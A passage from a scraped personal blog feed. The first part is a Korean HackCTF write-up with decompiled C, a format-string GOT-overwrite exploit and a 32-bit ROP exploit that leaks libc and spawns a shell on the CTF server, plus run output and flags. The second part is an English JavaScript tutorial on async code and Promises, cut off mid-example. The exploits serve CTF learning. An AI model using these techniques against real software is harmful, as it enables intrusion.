class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">“</span><span class="pl-cce">\n</span>You are platinum.<span class="pl-pds">“</span></span>);<br>      result = <span class="pl-c1">2LL</span>;<br>    }<br>  }<br>  <span class="pl-k">else</span><br>  {<br>    <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">“</span><span class="pl-cce">\n</span>You are silver.<span class="pl-pds">“</span></span>);<br>    result = <span class="pl-c1">1LL</span>;<br>  }<br>  <span class="pl-k">return</span> result;<br>}</pre></div></p><p>get_tier 함수를 보면 인자 값 a1을 이용해서 티어를 정하는 것을 볼 수 있고, 각 티어별로 반환하는  1, 2, 3, 4 입니다.<br></p><div class="highlight highlight-source-c"><pre><span class="pl-k">void</span> __fastcall __noreturn play_game(<span class="pl-k">signed</span> <span class="pl-k">int</span> a1){  <span class="pl-k">if</span> ( a1 != <span class="pl-c1">2</span> )  {    <span class="pl-k">if</span> ( a1 &gt; <span class="pl-c1">2</span> )    {      <span class="pl-k">if</span> ( a1 == <span class="pl-c1">3</span> )      {        <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">"</span>master can't play game. Sorry! :(<span class="pl-pds">"</span></span>);        <span class="pl-c1">exit</span>(<span class="pl-c1">0</span>);      }      <span class="pl-k">if</span> ( a1 == <span class="pl-c1">4</span> )      {        <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">"</span>Challenger. Take this first!<span class="pl-pds">"</span></span>);        <span class="pl-c1">system</span>(<span class="pl-s"><span class="pl-pds">"</span>cat ./flag<span class="pl-pds">"</span></span>);      }    }    <span class="pl-k">else</span> <span class="pl-k">if</span> ( a1 == <span class="pl-c1">1</span> )    {      <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">"</span>SILVER can't play game.<span class="pl-pds">"</span></span>);      <span class="pl-c1">exit</span>(<span class="pl-c1">0</span>);    }    <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">"</span>Who are you? get out!<span class="pl-pds">"</span></span>);    <span class="pl-c1">exit</span>(<span class="pl-c1">0</span>);  }  <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">"</span>platinum can't play game. :(<span class="pl-pds">"</span></span>);  <span class="pl-c1">exit</span>(<span class="pl-c1">0</span>);}</pre></div><p>그리고 함수를 보니 play_game라는 함수가 있는데, 해당 함수의 인자 값인 a1이 4면 FLAG를 읽는 것을 볼 수 있습니다. 즉, FSP 취약점을 이용해서 printf 함수의 got를 play_game에 주소로 바꿔주면 되고, v6의 값도 75보다 크게 바꿔 줘야 하는데, 이는 변수 위를 보면 s 변수가 위치한 범위 끝에 v5가 위치하기 때문제 2바이트만큼은 덮을 수 있습니다.<br></p><ul><li>시나리오<br></li></ul><ol><li>FSB 취약점을 이용해서 printf got의 주소를 play_game 함수로 바꿔줌.</li><li>fgets 함수에서 마지막 2바이트까지 꽉 채워서 보내주면 알아서 v5 값이 바뀜.<br></li></ol><div class="highlight highlight-source-python"><pre><span class="pl-k">from</span> <span class="pl-s1">pwn</span> <span class="pl-k">import</span> <span class="pl-c1">*</span><span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-en">remote</span>(<span class="pl-s">"ctf.j0n9hyun.xyz"</span>, <span class="pl-c1">3022</span>)<span class="pl-s1">e</span> <span class="pl-c1">=</span> <span class="pl-v">ELF</span>(<span class="pl-s">"./you_are_silver"</span>)<p><span class="pl-s1">play_game</span> <span class="pl-c1">=</span> <span class="pl-s1">e</span>.<span class="pl-s1">sym</span>[<span class="pl-s">‘play_game’</span>]<br><span class="pl-s1">printf_got</span> <span class="pl-c1">=</span> <span class="pl-c1">0x601028</span></p><p><span class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">“play_game addr : {}”</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">play_game</span>)))<br><span class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">“printf_got : {}”</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">printf_got</span>)))</p><p><span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s">“%4196055c”</span><br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">“%8$ln11”</span><br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p64</span>(<span class="pl-s1">printf_got</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">“s”</span> <span class="pl-c1">*</span> (<span class="pl-c1">46</span> <span class="pl-c1">-</span> <span class="pl-en">len</span>(<span class="pl-s1">payload</span>))</p><p><span class="pl-s1">p</span>.<span class="pl-en">send</span>(<span class="pl-s1">payload</span>)<br><span class="pl-s1">p</span>.<span class="pl-en">interactive</span>()</pre></div></p><p>여기서 <code>%8$ln11</code> 부분에서 8을 준 이유는 printf got에 값이 8번 째에서 나오기 때문입니다. 레지스터가 모두 출력 되고, 스택이 출력되는데 6번 째는 <code>%4196055</code>, 7번 째는 <code>c%8$ln11</code>, 그리고 8번째에 <code>printf_got</code>가 출력이 됩니다. 또한 <code>%8$ln11</code>에서 마지막 <code>11</code>은 8 바이트를 모두 채우기 위한 패딩입니다.<br></p><pre><code>                                              =11(\x10You are challenger.Challenger. Take this first!HackCTF&#123;N0w_Y0u_4re_b4side_0f_F4K3R&#125;Who are you? get out![*] Got EOF while reading in interactive$  </code></pre><blockquote><p>FLAG : HackCTF{N0w_Y0u_4re_b4side_0f_F4K3R}</p></blockquote><hr><p>HackCTF Challenge : ROP</p><p>이번 문제는 그냥 32 bit에서 간단한 ROP이므로 익스 코드만 작성하겠습니다.<br></p><ul><li>시나리오<br></li></ul><ol><li>write 함수를 이용해서 read 주소를 릭한다. 여기서 릭한 주소는 나중에 libc base 주소를 구할 때 사용</li><li>read 함수를 이용해서 bss에 <code>/bin/sh\x00</code>을 입력 받는다.</li><li>read 함수를 이용해서 read got를 system 함수의 주소로 덮는다.</li><li>read 함수를 호출하면 system 함수가 호출 될 것 이고, 이때 인자로는 bss를 넘겨주면 쉘이 따진다.<br></li></ol><div class="highlight highlight-source-python"><pre><span class="pl-k">from</span> <span class="pl-s1">pwn</span> <span class="pl-k">import</span> <span class="pl-c1">*</span><p><span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-en">remote</span>(<span class="pl-s">“ctf.j0n9hyun.xyz”</span>, <span class="pl-c1">3021</span>)<br><span class="pl-s1">e</span> <span class="pl-c1">=</span> <span class="pl-v">ELF</span>(<span class="pl-s">“./rop”</span>)</p><p><span class="pl-s1">write_got</span> <span class="pl-c1">=</span> <span class="pl-s1">e</span>.<span class="pl-s1">got</span>[<span class="pl-s">‘write’</span>]<br><span class="pl-s1">write_plt</span> <span class="pl-c1">=</span> <span class="pl-s1">e</span>.<span class="pl-s1">plt</span>[<span class="pl-s">‘write’</span>]<br><span class="pl-s1">read_got</span> <span class="pl-c1">=</span> <span class="pl-s1">e</span>.<span class="pl-s1">got</span>[<span class="pl-s">‘read’</span>]<br><span class="pl-s1">read_plt</span> <span class="pl-c1">=</span> <span class="pl-s1">e</span>.<span class="pl-s1">plt</span>[<span class="pl-s">‘read’</span>]<br><span class="pl-s1">pppr</span> <span class="pl-c1">=</span> <span class="pl-c1">0x8048509</span><br><span class="pl-s1">bss</span> <span class="pl-c1">=</span> <span class="pl-s1">e</span>.<span class="pl-en">bss</span>()<br><span class="pl-s1">read_offset</span> <span class="pl-c1">=</span> <span class="pl-c1">0xd4350</span><br><span class="pl-s1">system_offset</span> <span class="pl-c1">=</span> <span class="pl-c1">0x3a940</span></p><p><span class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">‘write@plt : {}’</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">write_plt</span>)))<br><span class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">‘write@got : {}’</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">write_got</span>)))<br><span class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">‘read@plt : {}’</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">read_plt</span>)))<br><span class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">‘read@got : {}’</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">read_got</span>)))</p><p><span class="pl-c">#BOF</span><br><span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s">“a”</span> <span class="pl-c1">*</span> <span class="pl-c1">140</span> <span class="pl-c"># buffer + sfp</span></p><p><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">write_plt</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">pppr</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">1</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">read_got</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">4</span>)</p><p><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">read_plt</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">pppr</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">0</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">bss</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">8</span>)</p><p><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">read_plt</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">pppr</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">0</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">read_got</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">4</span>)</p><p><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">read_plt</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">“aaaa”</span><br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">bss</span>)</p><p><span class="pl-s1">p</span>.<span class="pl-en">sendline</span>(<span class="pl-s1">payload</span>)</p><p><span class="pl-s1">leak</span> <span class="pl-c1">=</span> <span class="pl-en">u32</span>(<span class="pl-s1">p</span>.<span class="pl-en">recv</span>(<span class="pl-c1">4</span>))<br><span class="pl-s1">libc_base</span> <span class="pl-c1">=</span> <span class="pl-s1">leak</span> <span class="pl-c1">-</span> <span class="pl-s1">read_offset</span><br><span class="pl-s1">system_addr</span> <span class="pl-c1">=</span> <span class="pl-s1">libc_base</span> <span class="pl-c1">+</span> <span class="pl-s1">system_offset</span><br><span class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">‘libc_base addr : {}’</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">libc_base</span>)))<br><span class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">‘system addr : {}’</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">system_addr</span>)))</p><p><span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s">“/bin/sh<span class="pl-cce">\x00</span>“</span><br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">system_addr</span>)</p><p><span class="pl-s1">p</span>.<span class="pl-en">sendline</span>(<span class="pl-s1">payload</span>)<br><span class="pl-s1">p</span>.<span class="pl-en">interactive</span>()</pre></div></p><pre><code>pocas@pocas-VirtualBox:~/pwn/HackCTF/rOP$ python exploit.py [+] Opening connection to ctf.j0n9hyun.xyz on port 3021: Done[*] '/home/pocas/pwn/HackCTF/rOP/rop'    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)[*] write@plt : 0x8048340[*] write@got : 0x804a018[*] read@plt : 0x8048310[*] read@got : 0x804a00c[*] libc_base addr : 0xf7dbb000[*] system addr : 0xf7df5940[*] Switching to interactive mode$ cat flagHackCTF&#123;4bcd3fg7ijPlmA4pqrtuvxza2cdef&#125;$  </code></pre><blockquote><p>FLAG : HackCTF{4bcd3fg7ijPlmA4pqrtuvxza2cdef}</p></blockquote><hr></article>  </div><pre><code>&lt;/div&gt;</code></pre>  <details class="details-reset details-overlay details-overlay-dark" id="jumpto-line-details-dialog">    <summary data-hotkey="l" aria-label="Jump to line"></summary>    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast linejump" aria-label="Jump to line">      <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-jump-to-line-form Box-body d-flex" action="" accept-charset="UTF-8" method="get">        <input class="form-control flex-auto mr-3 linejump-input js-jump-to-line-field" type="text" placeholder="Jump to line&hellip;" aria-label="Jump to line" autofocus>        <button type="submit" class="btn" data-close-dialog>Go</button></form>    </details-dialog>  </details><pre><code>&lt;div class=&quot;Popover anim-scale-in js-tagsearch-popover&quot; hidden data-tagsearch-url=&quot;/wjddnjs33/wjddnjs33.github.io/find-definition&quot; data-tagsearch-ref=&quot;master&quot; data-tagsearch-path=&quot;backup_md/2021-01-25-pwn.md&quot; data-tagsearch-lang=&quot;Markdown&quot; data-hydro-click=&quot;&#123;&amp;quot;event_type&amp;quot;:&amp;quot;code_navigation.click_on_symbol&amp;quot;,&amp;quot;payload&amp;quot;:&#123;&amp;quot;action&amp;quot;:&amp;quot;click_on_symbol&amp;quot;,&amp;quot;repository_id&amp;quot;:333657172,&amp;quot;ref&amp;quot;:&amp;quot;master&amp;quot;,&amp;quot;language&amp;quot;:&amp;quot;Markdown&amp;quot;,&amp;quot;originating_url&amp;quot;:&amp;quot;https://github.com/wjddnjs33/wjddnjs33.github.io/blob/master/backup_md/2021-01-25-pwn.md&amp;quot;,&amp;quot;user_id&amp;quot;:null&#125;&#125;&quot; data-hydro-click-hmac=&quot;646d4147719c9a1b60af00fa0bfa2b2343f01eed3b2be66dfa686328ab62e2e3&quot;&gt;</code></pre>  <div class="Popover-message Popover-message--large Popover-message--top-left TagsearchPopover mt-1 mb-4 mx-auto Box color-shadow-large">    <div class="TagsearchPopover-content js-tagsearch-popover-content overflow-auto" style="will-change:transform;">    </div>  </div></div></div>  </div></div><pre><code>&lt;/main&gt;</code></pre>  </div>  </div><div class="footer container-xl width-full p-responsive" role="contentinfo">  <div class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between pt-6 pb-2 mt-6 f6 color-text-secondary border-top color-border-secondary ">    <ul class="list-style-none d-flex flex-wrap col-12 col-lg-5 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">      <li class="mr-3 mr-lg-0">&copy; 2021 GitHub, Inc.</li>        <li class="mr-3 mr-lg-0"><a data-ga-click="Footer, go to terms, text:terms" href="https://github.com/site/terms">Terms</a></li>        <li class="mr-3 mr-lg-0"><a data-ga-click="Footer, go to privacy, text:privacy" href="https://github.com/site/privacy">Privacy</a></li>        <li class="mr-3 mr-lg-0"><a data-ga-click="Footer, go to security, text:security" href="https://github.com/security">Security</a></li>        <li class="mr-3 mr-lg-0"><a href="https://www.githubstatus.com/" data-ga-click="Footer, go to status, text:status">Status</a></li>        <li><a data-ga-click="Footer, go to help, text:Docs" href="https://docs.github.com">Docs</a></li>    </ul><pre><code>&lt;a aria-label=&quot;Homepage&quot; title=&quot;GitHub&quot; class=&quot;footer-octicon d-none d-lg-block mx-lg-4&quot; href=&quot;https://github.com&quot;&gt;  &lt;svg height=&quot;24&quot; class=&quot;octicon octicon-mark-github&quot; viewBox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;24&quot; aria-hidden=&quot;true&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;</code></pre></a>    <ul class="list-style-none d-flex flex-wrap col-12 col-lg-5 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">        <li class="mr-3 mr-lg-0"><a href="https://support.github.com" data-ga-click="Footer, go to contact, text:contact">Contact GitHub</a></li>        <li class="mr-3 mr-lg-0"><a href="https://github.com/pricing" data-ga-click="Footer, go to Pricing, text:Pricing">Pricing</a></li>      <li class="mr-3 mr-lg-0"><a href="https://docs.github.com" data-ga-click="Footer, go to api, text:api">API</a></li>      <li class="mr-3 mr-lg-0"><a href="https://services.github.com" data-ga-click="Footer, go to training, text:training">Training</a></li>        <li class="mr-3 mr-lg-0"><a href="https://github.blog" data-ga-click="Footer, go to blog, text:blog">Blog</a></li>        <li><a data-ga-click="Footer, go to about, text:about" href="https://github.com/about">About</a></li>    </ul>  </div>  <div class="d-flex flex-justify-center pb-6">    <span class="f6 color-text-tertiary"></span>  </div></div>  <div id="ajax-error-message" class="ajax-error-message flash flash-error" hidden>    <svg class="octicon octicon-alert" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.22 1.754a.25.25 0 00-.44 0L1.698 13.132a.25.25 0 00.22.368h12.164a.25.25 0 00.22-.368L8.22 1.754zm-1.763-.707c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0114.082 15H1.918a1.75 1.75 0 01-1.543-2.575L6.457 1.047zM9 11a1 1 0 11-2 0 1 1 0 012 0zm-.25-5.25a.75.75 0 00-1.5 0v2.5a.75.75 0 001.5 0v-2.5z"></path></svg>    <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">      <svg class="octicon octicon-x" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"></path></svg>    </button>    You can’t perform that action at this time.  </div>  <div class="js-stale-session-flash flash flash-warn flash-banner" hidden    >    <svg class="octicon octicon-alert" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.22 1.754a.25.25 0 00-.44 0L1.698 13.132a.25.25 0 00.22.368h12.164a.25.25 0 00.22-.368L8.22 1.754zm-1.763-.707c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0114.082 15H1.918a1.75 1.75 0 01-1.543-2.575L6.457 1.047zM9 11a1 1 0 11-2 0 1 1 0 012 0zm-.25-5.25a.75.75 0 00-1.5 0v2.5a.75.75 0 001.5 0v-2.5z"></path></svg>    <span class="js-stale-session-flash-signed-in" hidden>You signed in with another tab or window. <a href="">Reload</a> to refresh your session.</span>    <span class="js-stale-session-flash-signed-out" hidden>You signed out in another tab or window. <a href="">Reload</a> to refresh your session.</span>  </div>    <template id="site-details-dialog">  <details class="details-reset details-overlay details-overlay-dark lh-default color-text-primary hx_rsm" open>    <summary role="button" aria-label="Close dialog"></summary>    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast hx_rsm-dialog hx_rsm-modal">      <button class="Box-btn-octicon m-0 btn-octicon position-absolute right-0 top-0" type="button" aria-label="Close dialog" data-close-dialog>        <svg class="octicon octicon-x" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"></path></svg>      </button>      <div class="octocat-spinner my-6 js-details-dialog-spinner"></div>    </details-dialog>  </details></template><pre><code>&lt;div class=&quot;Popover js-hovercard-content position-absolute&quot; style=&quot;display: none; outline: none;&quot; tabindex=&quot;0&quot;&gt;</code></pre>  <div class="Popover-message Popover-message--bottom-left Popover-message--large Box color-shadow-large" style="width:360px;">  </div></div>  </body></html>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Promise &amp; Async processing of javascript</title>
      <link href="2021/03/09/2021-03-09-Promiseasync/"/>
      <url>2021/03/09/2021-03-09-Promiseasync/</url>
      
        <content type="html"><![CDATA[<p>I studied about Promise and Async process today. Promise is object used for async processing and it is mainly used to display the data received from the server on screen.</p><p>First, We need to know <code>async processing</code> before studying <code>Promise</code>. <code>Async processing</code> is a feature of javascript that executed the next code without stopping before operation of a particular code finishes.</p><blockquote><p>First example code for Async Processing </p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result;</span><br><span class="line">  $.get(<span class="string">&#x27;http://burp.kr/product.html&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">response</span>)</span>&#123;</span><br><span class="line">    result = response;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(a());</span><br></pre></td></tr></table></figure><p>You see code as above and what thinks output value?</p><p><img src="https://github.com/wjddnjs33/image/blob/main/async-1.png?raw=true"></p><p>Like picture as above, print the <code>&#39;undefined&#39;</code>. Why?? :) This is because execute next code(<code>return result</code>) before operation of a  <code>$.get()</code> method finishes</p><blockquote><p>Second example code for Async Processing </p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Hello&#x27;</span>);</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">&#125;, <span class="number">5000</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Hello pocas&#x27;</span>);</span><br></pre></td></tr></table></figure><p>The code above executes the logic after a specific time used <code>setTimeout()</code> method. So how would the above code print it out?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">First, output</span><br><span class="line">Hello</span><br><span class="line">Bye</span><br><span class="line">Hello pocas</span><br><span class="line"></span><br><span class="line">Second, output</span><br><span class="line">Hello</span><br><span class="line">Hello pocas</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure><p>What do you thinks? First? Second?</p><p><img src="https://github.com/wjddnjs33/image/blob/main/async/async-2.png?raw=true"></p><p>Second!! The <code>setTimeout()</code> method is also async, execute the next code before the operation finishes. So, let’s fix problem using the callback function in the First example.</p><blockquote><p>The sollution for first case</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">callback</span>)</span>&#123;</span><br><span class="line">  $.get(<span class="string">&#x27;http://burp.kr/product.html&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">    callback(res);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line">a(<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>I wrote sollution code as above. Above code is send to callback function a return value of <code>$.get()</code> method.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/async/async-3.png?raw=true"></p><p>So, it doens’t print “undefined” and return value of <code>$.get()</code> method. Now, we know async and callback. So we will learn the <code>Promise</code></p><hr><p>I said about Promise from above. One more time, I will say. <code>Promise</code> is object used async processing. So we will learn about <code>Promise</code> from now on.</p><blockquote><p>Promise Code - First Example</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">as</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    $.get(<span class="string">&#x27;http://burp.kr/product.html&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(res)&#123;</span><br><span class="line">        resolve(res);</span><br><span class="line">      &#125;</span><br><span class="line">      reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Request is failed&quot;</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">as</span>().then(<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>The code above code is a basic example using <code>Promise</code>. first send to request using <code>$.get()</code> and when the operation is finished of <code>$.get()</code>, I call the <code>resolve()</code> and pass argument a return value of <code>$.get()</code></p><p>And when the <code>esolve()</code> method is called, the value is passed using the <code>then()</code> method.</p><blockquote><p>hmm.. So what are the resolve() and reject() methods?</p></blockquote><p>When Promise works, there are three states. states is pending, fulfilled, rejected! peding is async processing logic has not complete, fulfilled is async processing logic is completed and returns the result value, rejectd is async processing has failed or an error has occurred.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ~~~</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>As above, The moment the <code>Promoise()</code> it, it will be in Pending state. And you can define a callback. callback have two method. first is <code>resolve()</code> and second is <code>reject()</code>. <code>resolve()</code> is called when it is done request well and <code>reject()</code> is called when ti is return error.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  resolve();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Here, When well execute <code>resolve()</code> method of callback it, It will be in fulfilled state.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 